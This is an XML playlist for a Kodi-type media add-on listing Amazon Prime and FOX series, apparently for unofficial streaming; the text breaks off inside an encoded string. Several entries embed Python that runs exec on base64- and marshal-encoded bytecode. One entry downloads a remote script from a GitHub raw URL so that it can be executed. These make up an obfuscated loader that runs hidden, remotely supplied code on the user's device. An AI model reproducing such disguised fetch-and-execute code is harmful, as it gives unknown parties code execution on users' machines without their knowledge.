<?xml version="1.0" encoding="UTF-8" standalone="yes"?>


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]Amazon Prime.[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/QaTc8Hx.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>

--------------------------------------------------------------------------------------------------------------

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]FOX[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHZ4TUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGT2JVMHpUa1JqTWs1NlJYcE5SR040VFhwWmVrNTZXVEpPZWxVeFRYcE5lRTV0VlhwUFZGVTFUWHBCTWxwVVRURk9WR3Q2VFhwWk1FNTZSVE5PUkZFMVRucHJlazVVVFhsTmVtc3lXbXBqTkUxNlFYbFphbHBwVG0xRk1sbDZVWHBPVkdzeVRXcFJlazV0VFRCTmFrMTNUa2RSZWsxcVVYaE9SR2Q2VFZSWk5VMTZaekJhVkUxM1RrUm5NRTlVVW0xT2VtY3dUMVJWZVUxNlNUQlBSR00xVFhwWmVWcHFXVEpPVkdzelQwUlZlVTVYUlROTmVtTTFUVzFaTWsxVVVtMU9iVVV5V21wVmQwMTZWWHBQUkZFeFRtcHJNVTFVVlhkT1JHY3hUbXBaTUUxNlkzbFphbEpyVG5wck1scFVTbTFOZW1jeVRrUmplVTU2WXpGT2VtTXdUbnBuZVZwcVVUUk9SR2Q2VG5wS2FVMTZhekJPUkZKcVRXMVplVmxxVFRST2FtZDVXV3BLYlU1SFRURk5hbFYzVG5wWmVrMVVUWGhOZW10NVdXcEtiVTVxVlRGT2FsbDZUa2RWZWs1NldUSk5lazB5V1ZSTk5VMTZhekpPVkZFd1RtMVZlazlFU20xT1ZFRXpUWHBrYUUxdFNYcFBSRmswVG5wUk1VOUVVVEpPUkdkNVdtcEtiVTE2YXpGWlZGa3lUWHBaZWs5VVl6Qk5lbGw2VDBSUk5FNXFWWHBQVkVwdFRXMVplVmxxVFhsT2Vsa3pUbXBLYlUxNlFUTk9WRmswVFhwbk1VOUVXbXBPZWtFeFRtcE5NVTF0V1hwT1ZHTXdUWHBaTTA1VVdtbE9iVTE2VGtSak0wNXFVWHBPYWxKb1RtcEpNRmxxV1RCTmVrRjZUMFJOZWs1VVp6Sk5hbEV6VG5wck1scHFXbXRPYWtWNlRsUmpNVTVVV1hwT1ZFMDBUbFJaTWxsNldYcE9iVmw2VFZSU2JFNVVZekJaZWswMFRtcE5lazlFWXpWT1ZHc3pXVlJqTTAxdFNYbFphbEpxVG1wbk0wOUVXWGxPZWxVeVRYcFplazVVVFhwTlZGa3lUbnBKTUZwcVRYZE9iVTB6VFhwTk5VNVVaekpPYWswMFRsUlplazE2WkdoT2FtTXpUbXBaTVU1WFJUSk9SRlV6VG0xVk0wNTZaR2hPYWsweVRsUlNhazVFWnpGUFJGVjRUa1JuTWsxcVRYbE9hazB4VG5wWk0wMTZUVEpQVkZVeFRYcE5NMDU2WXpCT2Vra3lXbFJWTTA0eVJUSk9hazE0VG0xUk1GcFVXbXBPZWtsNlRsUk5lazVVVlRGUFJGazFUbXBOTVZsVVdUSk9iVkV5V2tSTmVrNTZTVE5OYWxKc1RsUkpNRnBxV1RCT2JVa3lUWHBrYUUxNldYcE5WRTE0VG0xUk1VNXFXVEZPZWtVeVdYcGplVTVYUlROUFZGa3pUbTFOTTAxVVVteE9lbU16VFhwWk5VNVVVVEpOYWxVMVRtMVZlazU2V1hwT1YwVXdXbFJSTVUxdFdUSk9SR04zVG5wck0wMXFXVEJPZW1NelRVUmFhRTVFVVRGT2FrcHBUbFJqTVZsVVdteE9SMVY2VFZSWk1VNXFhekJhYWxsNFRucE5NMDlVVVROT2VsRXlUbFJaTVU1RVRUTk5hbU14VG5wSk1VNTZZM2RPYWswd1dYcGthRTE2UlRCYVJGSm9UakpGTWsxVVpHaE5la2t5V2tSUk5VMXRXVEpPYWxFMVRrUlZNMDFVVFRKT1IwMTZUMFJSTWsxNlFYcE9hbFUwVFhwTk0wNVVUVFJPVjBVeVdWUlNiVTU2VFRCYVJHUm9UbXBWTUZwcVVtdE9lbEV5VG1wU2FFNTZhekpPUkZrelRtMUpNMDVVVFROT2FsVjZUVlJOTUUxNmF6Tk5hbU41VGtkUk1rNVVZekpPVkZrelRWUlNhazF0V1RGUFJGSnNUbFJCTUZwRVl6Vk9SRVV6VG5wTmVVMTZhM3BPZW1NMFRucG5lazlFVFRCT2VrRXlXbXBXYUUxdFNUQk5WRTB4VFhwbk1VMXFZek5PYWtsNlRsUlZORTVYUlRKT1ZGVjVUa1JGTWsxcVRUSk9lbU13V1hwS2FVNXRVVEpPUkZFd1RrZFpNMDlFV1RST2FtTXlXVlJLYlU1VVJURk9WR1JvVG1wRmVWbHFZelJOZW10NlRtcFpNMDE2V1hwTlJGVXpUbTFSTVUxNll6Qk9SR3N4V1ZSTk1rNUVWVEJQVkdNeFRucHJNazlFVlhkT2FtY3hUMFJaTUU1RVl6Tk5hbEp0VG1wak1GcFVXVEpPYWtVeVdtcFplRTU2U1RCTmVsVXdUbTFWTVUxRVkzZE9SR3N4VFVSYWJFNXRXVEJOYWxVeFRrZFZlazFxVVhsTmJWbDZUbXBWZWs1RVZYcE5lbU16VFhwTk0wNVVVVEZPVjBWNlRtcFZkMDVFU1RGUFJFMHdUbFJSTWxwVVdURk9WR016VDFSTk0wMTZRVE5PZW1NeFRYcG5NbGxxVFRWT2Fsa3hUWHBOZVU1NlNUSlBWRkV5VGtSUmVWbHFWWGhPVkVGNlRtcGthRTVIU1ROUFJHTjZUa2ROTUZwcVZUVk9WRkV6VG1wVmVrMTZUWHBOYWxwcFRsUlpNazU2VlhkT1ZFRXpUV3BWTUU1cVZYcFBSRmt6VG5wSk0wNXFZelJOZWxFeVdXcFJORTU2YXpCYWFtTXdUa1JGTTAxcVkzZE9iVmt6VDFSS2JVNXRWVEpQUkZVd1RsUnJlazFFWTNoTmVsa3lXV3BWZDA1NlRUQk9WRmt4VG1wRk1rNTZUWHBPVkVFeVdXcE5ORTVxWnpCT1JFMDFUbGRGTWs1Nll6Sk9lbXQ2VDBSS2FVNUVTVE5aVkdNelRqSkZNRnBVVlhwTmVtY3lXWHBaTUU1VVNUQk5lbGw2VGtSck1VNUVWWGROZWxGNlRrUk5OVTE2VlROUFZGVXlUa1JWTWxsNldURk9WRVV6VGtSS2FVMTZRWHBPVkZWNFRrUk5NazVVV21oT1ZHTXpUMVJSTVU1VVp6Sk5lbU42VGtScmVrOVVUWGhPYlVVeVdsUldhRTVYUlRGTmFtTjNUbFJuTUZwVVdYcE9WRWw2VFZSTk1VMTZTVEpQUkZWM1RXMVpNRTE2WkdoT1JFa3hUa1JOTkU1VVRUSk9WRnBxVGxSck0xbFVUWGxPUjFGNlRXcGFhMDU2V1RKT1JGa3hUbTFOTWsxVVRUSk9iVkV6VDFSYWJVNUVSWHBPVkdNd1RYcFpNRTU2VFRWT1ZHc3lUVlJLYlUxNlJUSlpWRlYzVGxSbk1rOUVWVEpOZWxVeVRXcFdhRTVxVFRKT1ZFMDFUa2ROTWsxNlVtaE9SMDB3VFZSTk0wNXFVVEJaZW1Nd1RucG5NMDFVVVRGTmVtY3hUMFJOTlU1Nll6Tk5SRTB5VGtSck1rNUVUWHBPYWxFeVdrUkthVTVxUlROT2FscG9Ua1JqTWsxcVkzbE9WRWt3V21wUmVFNVhSVE5PYW1ONFRucFJNRTFxVVRSTmJWa3pUVlJaTTA1cVdUTk5hazB6VFhwQk1VMUVUVEZPUkd0NlRXcFpNazVFYXpCWmVrMTVUa1JqTTAxcVVURk9lbGt4V1ZSUmVrNXRWWHBPYWswMVRsUk5NbGxVV1ROT1JFVjZUMVJqZWs1SFRYbGFhbFV4VG5wRk0wNXFZM2ROZW1zeldWUlNiVTE2YXpKWlZHUm9Ua2RGTVU1RVNtMU5iVWt3VGxSUk5FMTZVWHBPYW1ONFRsUm5NMWxVWTNwT2JWVjZUbXBqTWs1RVl6Tk5lbU13VGtSbmVWbHFVWHBOZW1ONlRucFNhazVFUlROT2FtTXhUa1JKTTAxcVVtcE9SR013VFZSVmQwMTZXVEJOZWxFMVRsUkpNbGw2V21wTmVsa3hUMFJWTVU1RVp6Sk5hazB3VG0xVk1VMVVXVEpPYWxFeVdWUlNhMDVVV1RCYVJFMTVUWHBOZVZscVVURk9WR2Q2VFdwamVFMXRXVE5QVkZKclRrUkpNRTlFVlRWT2FsVXhUV3BaZUUxdFdYcFBSR04zVGxSTk1VOUVVVEpPZWxreldWUlZkMDVVWnpKUFJHTTFUa1JWTUUxVVdUQk9iVVV5VG1wamVFNUVXVEZOUkZab1RtcFpNRTFVVlRCT2Fsa3lUbnBLYVUxNlZUTk5lbFpvVFcxSk1FMTZTbTFPZWxrd1RucEthVTU2U1RCYVJGWm9UWHBGTVUxVVdteE9la2t4VFhwTmVFNVVRVE5aVkZVeVRucEZNazFxVlRKT1IwVXhUbFJqTUU1cVl6SlBWR042VG5wVk1FMVVZekpPYW1ONlRucFZOVTVIVlhwT1ZGVXhUbXBuTUZwcVRUQk9SRVV5VG1wS2FVMTZXVEZaVkZFeFRsUkJNMDlFWTNkT1IxRjZUVVJOZUU1NlZUQmFhazE1VG5wQk0wMUVUWGhOZWtFelRtcFJNVTVFWnpKT1ZGSnFUa1JyTUU1NldUSk9SMFV5VDBSVk1rNTZVVEpOVkZsNlRrZEpNVTFFVVROT1ZGVjVXV3BSTlU1dFVUTk9lbU41VFhwbk1VMVVZelJOZWxFeVRrUlJNRTE2U1RKWmFrcHRUbnByTWsxVVRUVk9hbU15V1ZSak0wNXRXWHBPYWxrMFRYcE5lazlFV21wTmVrRXdUbXBOZUU1WFJUQk9SRkpxVGxSUk1VNUVXVEZPYlZrelRucFJNMDU2YXpKT2VsSnRUVzFaTWxwVVZYZE9SR015VFZSTmQwNTZhekpOZWxWNlRrUlplazE2Vm1oT2FtY3dUMFJSTTA1cVJYcE9SRkpwVG5wVk0wNTZZM2RPZWtrd1dWUmpORTE2V1RKT1JHTXhUa1JKZWsxNlRYbE9SR041V1dwU2FVNXRTWHBOZWxWNFRtcGpNVTlFVFRCT2VrRjVXV3BqTTA1dFZUSlBWRnBzVGtSbk0wMUVUWGxPUkd0NlQwUmFhazVVVFROT2VsSnBUVzFKTVUxcVVteE9hbEV4VFZSak5FNTZVVE5QVkZGNFRXMVplazFFWTNsT1Ixa3dXa1JOTkU1RWF6Sk9ha3B0VGxSck1GcFVUVEpPYlZFelRYcGFhRTVVYXpCYWFrMDBUbFJWTWsxcVkzZE9SR015V1hwYWFFNUVTVEJhYWswMFRrUm5NRnBxVFhkTmVrMHpUV3BSZUU1RVl6QmFWRkV6VG1wbk1FOUVUVE5PUjAweFRsUlpNVTVVVVhwT2FsVjVUbTFGTVU1RVl6Sk9lbXN4VFZSamVVNXRXVEJOVkVwcFRucFJNMDFFVW10T2Fsa3dUMVJaTTA1cVVUSmFha3B0VFhwWk1FMXFUVFJPUkdjelRsUlNhVTVVUlRKTmVsVXlUa2RaTWs1VVRUQk9SMUV4VFVSak0wNVVVWGxhYWxFMVRYcFJNVTVVV214TmVtY3hUbXBOTVU1VVJUQk9WR013VFhwQk1FMTZVVEpPZWxreVdsUmFhMDU2V1RCTlZGbDVUbnBuTWxsNldteE9hbXN3VFdwak1rMTZXVEpPZWswelRsUnJNMDVxV214T2JVa3pUbXBOTkU1dFZURlpWRmt5VFhwWmVWbHFZek5PVkZGNlQwUlpNMDV0UlhsYWFsRTFUa2RWTVUxNlVtaE9hbFV5V21wUk1FNXFXVE5OVkZFelRYcE5NazFVV1RSTmVrMHhXVlJSZVU1VVFUQk9hbFYzVFhwQk1FOVVZekZPZWswelRtcFNhVTVxU1RGT1ZGVXhUbnBaTVUxcVVUQk5lbFV5VDBSWmVVNUVXVEJPYWxWM1RtcHJNRTlVWXpGT1IxRjZUMFJWTVU1cWEzbGFhbGswVG0xRmVrMTZZM2RPYWxWNlQxUlJNRTE2VFRGTmVsVjNUWHBGTVU5RVdURk9SRlY2VG1wS2JVNTZaek5OYWsxNVRrUlJNMDVVVVRGTmVrVXlUWHBOTTA1RVJUQmFWRTAxVFhwRk1rNVVWWGhPUkdjd1drUlZNRTVFWXpCWmFsSnBUbFJKZWs5RVl6Tk9la0V6VFVSU2JVNTZUVEZaVkdNMFRYcFpNRTVxVFhwT2VrRXdUWHBhYkU1RVZUQlpla3BwVGtSck1VNUVUVFJPVkVVeldWUk5OVTVxV1RCUFJFMTRUbnBaTWxscVVUQk9SMWt6VDFSamVVNUVSVEpPVkUwMVRYcFZNRTFxVVRSTmVsVXpUbnBqTWsxNlVUQlphbFYzVGxkRk1sbFVXbXhPYW1Nd1dXcFpNazVxV1RCUFJFcHRUa1JOTVU1NlkzcE9WRTB3V2xSak5FMTZZek5QVkZFd1RXMUplazVFVlRCTmVsVXdUVlJSTkU1WFJYcE5SRkpzVGtkWmVWcHFXWGhPYlZWNlRYcFZNVTVxVlhwUFZGSnRUa1JKTUU5RVRUQk9SR2N4VG5wTk5VNXFVWGxaYWxwc1RXMVpNazFxVFRST01rVXdUa1JWZWs1NldUQmFhbEY1VG5wWk1GcEVWWHBOZWxFelRXcFdhRTV0VVRCUFJGcHJUbFJuZVZwcVdtMU9iVkY1V21wUmVVNXRWWHBOUkZKcFRrUnJNazVVWTNwT1JFVjVXbXBhYWs1cVl6Qk9hazEzVG0xRk0wOUVXbWhPUkdjeFRucGFiRTE2VFRGTlZFcHBUbGRGTTA1RVRURk9WRVY2VDFSVmQwMTZRWHBPYWsxNFRsUlJNMDFxVFRGTmVsRXpUa1JWZDA1VVJUSk9WRlV4VG1wck0wNXFWWGxOZWsxNlRsUmpORTU2VFRCT2VrcHRUa2RGTTA1cVVtdE5la2w2VGtSYWFFNXRTVEJOVkZWM1RtcE5NVTVVWXpKTmJVbDZUbXBSZUUxNlp6SlpWRTAwVG0xTmVrMTZVbWhOYlVrd1dWUlZlazU2WXpCT2VrcHRUa2RSTWs1NldUSk9WRVV5VFdwak5FNXRXWGxhYWsxM1RtMVZlazFFVFhwTmVsVXdUV3BTYlU1VVRUSmFSR015VGpKRk1rNTZUVFZPVkZGNlRYcFNiRTVxYTNwT2FtUm9UbnBKTUUxNldURk9SR3N3V2xSS2JVNXRVWHBQVkZFeFRrZFpNazVFVVRSTmVtY3lUbnBqTWs1cVNURlBWRkV3VG5wWk0wOVVUVEJPZWtGNVdXcFpORTVVUVRKT2VsVjVUbnByTUUxNlVtMU9SR3N6VFVSTk1VNUhUWHBOYWxab1RtMUZNMDlVV21wT2JVVXdUWHBLYVU1SFRYcFBWRlV6VG0xVk1sbFVUVEZPUkdONVdXcFNhMDVVVVhwT1ZFMTRUbFJSTWxwVVVYbE9WRUY2VFdwYWFFMTZWVEpPZWxFd1RucE5NRTVFVm1oT2JVMHlXbFJTYTA1SFJUQmFhazAwVGtkTk0wNVVZelJOZWtFeVdsUlZNVTVFWTNwUFZGcHRUa1JGZWs5VVkzaE9WRlV5VG1wVmVrNTZZekZQUkdONVRtMUpNRmxVVFRST1ZGVjZUMFJrYUUxdFdUTlBSRlY2VGtSWk0wMUVUWGxOZWtreVdYcE5NazE2V1RCT2FscHFUa1JyTTAxNlRURk9SR014VFVSUk5VNTZhekJPUkUxNFRrUlJlazE2VVRWTmJWa3hXVlJOZUU1RVRUSlphbU15VG0xVk1VMTZZelJOZWsweldWUlZkMDE2V1RKUFJFMTZUbTFKZVZwcVZURk9SRkY2VDFSU2FrNUVSVEphVkUwd1RYcFZlazFVWXpST2VsRXlXa1JWTWs1cVZUSlBSRnBvVG5wbk1VMXFZM2xOYlVsNlRXcGpkMDE2YXpGT2FscHFUa2RWZWs5VVl6Tk9iVlV6V1ZSUmVrNUVaekJhYW1NMVRucEpNazlVVFRST01rVjZUVVJqTUU1NlRUTk9lbGswVFhwTk0wNVVWVEZPVkZFeFRrUlJNazU2V1RCYVJFMTZUWHBaTWs5RVdUUk9lbWN4VFVSYWFFMTZTVEpQVkZKb1RYcHJlazFVV1RST1ZGRXlXbXBqTTA1WFJYcE9lbU0xVGtSSmVrMXFVbTFPVkZGNlQwUlZlRTVxV1hwUFZGSnRUbXBOTWs5VVRYaE9SMVV5VGxSTmQwNUVWVEpPYWxWNlRsUmpNbHBxWXpSTmVsRXlXbFJOTWs1NmF6Tk5lbU14VGtSck1sbHFUVFJPVkUweVdYcFZkMDE2YXpKUFZFMHlUbnBaTTAxVVZYZE9SMWt3V2tSVk5VMXRXVEpPZWxKdFRXMUpNazU2VVhsTmVtY3lUWHBLYlUxNlp6QmFSR013VGtkSmVrMXFZM2hPUjFreVRsUmFhRTU2UVRCYVZFMHhUbnBOTUU5RVdYcE9hazB5V1ZSTk0wNVVSVEZOVkUwMVRucE5NVTVVVFRCT2FtY3lUa1JOTWs1cVl6Tk5SR013VG5wRk1FNVVZekpOZW1jd1RsUlZOVTVxVlROT1ZGSnBUVzFKTVU5RVZYaE9iVlY2VG1wWk1FNXRUWHBOUkUxNlRrZFZNRTlFU21sT2VrVjZUbnBOZUU1NlJUSk9WRTE1VGtScmVrMXFZelZPZW1NeFRXcE5lazU2YXpKT2VtTjNUbTFGTUZwRVdUSk9WR3N3VDBSS2JVMTZVVEpaZWxVeFRsUkZlVmxxWkdoTmVsa3hUMVJWTlU1dFdURk5SR00xVG0xWmVWbHFZelJPYlZVeVdWUmpNazU2YXpGTmFsa3dUWHBCTWxwVVdYUy9Fd0FBTVZwdFVqTkJkM0JxUVZGSWJWcHRTREJCZDBReFRFZHhkVnB0VmpKTmQwd3dXbTE0TUZwSFYzWkJlbEl6VEVkYWJFRktVak5NUjFveFFWUkVNRUZIVjNaQlZGWXpXbmRhTTFwdFdqRkNSMGhxV20xNE1GcDNUREpCUjNBeVFYZHdNRnB0VGpOTVIwMTZRVWRJTWtGUlNETkJSM0F5V20xSU1scHRjREZDUjFveFdtMU1NRnAzU0RCYWJVZ3pXa2R3TlVGM1RETkJSMFJzV20xYWJVSkhSREZCVVhRelFVZEliRnB0U0d4TWQzQTFRVzFNTTBKUmNHeEJWRVF6UWxGSmRVRnRjREZhVVZkMlFVZE1Na3hIY0RSQlVWSnRXbTFhYTBGdFZqRmFVVnBzUVhwRU1rSlJSRFJhZWxZeVRFZEZkMEZ0VW0xQmQxcHJRVzFNTTB4SFNHcGFlbFl5UWtkTU0wRlJUR3hNZDB3MFFYZE1NMEZ0UlhkQmQweHRXbmRFYkZwNlZqTmFVVVYzV20xMGJVRkhUWFpCZWtodFdtMUVOVUY2U0RGYVVVMTRRVkY0TWtGSFNEVkJSMHh0UVVkSU1rRlVTREpCVVZwcldtMVNNRUZ0Y0RKQlVVeHNUSGR3YTBGdFZqRkNVVm95UVVkME0wRlJXalJCZWxwdFFrZE1Na0ZVUkRGYVIxb3pRVWRTTTBGM1dqSkJSMW93UWxGWGVrRkhkREZhZDBnd1FUSlNNazEzY0RCQlIzZ3dRVkZhTWtGdGRHMWFiWEYxUVhkMGJVRjNXakpCU2xJd1RWRmFNVnB0VGpGYVVVUXpRWGRFYlVKUldtdGFiVXh0V20xTU1rRlJWak5CUjBSclFWRldNa0YzY0cxQlZGb3hXbEZ3TVVGUmVHMUJSMFJyV20xYU1rMTNTRFZCYlVnd1RWRk1NRUYzVmpGQ1VVMTRRVWRPTWtGSFJEVkJiVWd4UWtkSU1scHRVakJCYlhBeVFXMUlNVnBSVjNaYWJWWXlUVkZKZFZwdGRETmFkMW8wUVZGYU1VSlJUWFZCZDNSc1RYZEVNMEZSY0RKQmQzQnRRWGQwYkV4M1REVmFiVm96UWtkRWExcDZURzFhUjBSdFFYZFNNRXh0Y0RCQmJVNHdUWGRJYkZwdFdqTmFSMDEzUVZSYWJWcFJTRFZhYlhneFFrZFhlbHB0ZEcxQmQzQXlRVEpTTTBKUlJYbGFla3d6VEVkTU1FRjNXbXhOZDAxM1dtMTRNRnAzV20xQmJVZ3lXbmRGZWtGdFdtMUNVWEEwUVhkTU1rMUhTREJCVkV3eVRYZE5kMXA2VmpKTWJWZDZRWGRFTVVGUlYzcEJWRVF3UVcxYU5FRnRkREpOUjNCclFYZHdNazFIVFhkYWVrd3pRVWR3TlVGUmRHMWFkMFYxUVhkRWJVRnRjRFJCZDNRd1FsRk5kbHB0V2pOTVIwZ3hRVlJNYkUxM2NHMUJSMDR6UWtkSU1FRnRlREJCUjBWNlFWRklNRUZ0VERCQmJVNHdRbEZhTVVGM2NERk1SMW8wUVVkTWJVRjNUWFpCZWxvd1drZE1Na0YzZERGQlVVM